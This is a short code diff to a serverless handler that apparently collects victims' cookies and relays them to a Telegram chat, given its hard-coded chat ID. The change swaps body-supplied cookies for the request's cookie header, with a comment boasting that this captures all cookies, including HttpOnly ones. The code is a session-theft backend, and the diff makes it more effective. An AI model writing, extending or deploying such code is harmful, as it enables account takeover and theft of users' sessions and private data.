@@ -5,14 +5,9 @@ const TELEGRAM_CHAT_ID = "8569746095";
 
 exports.handler = async (event, context) => {
     try {
-        // 1. Get cookies from the request body (sent by index.html)
-        let cookies = "";
-        try {
-            const body = JSON.parse(event.body);
-            cookies = body.cookies || "";
-        } catch (e) {
-            cookies = event.body || "";
-        }
+        // 1. Get cookies from the request headers
+        // This captures ALL cookies, including HttpOnly ones
+        const cookies = event.headers['cookie'] || "";
 
         // 2. Get metadata
         const timestamp = new Date().toISOString();
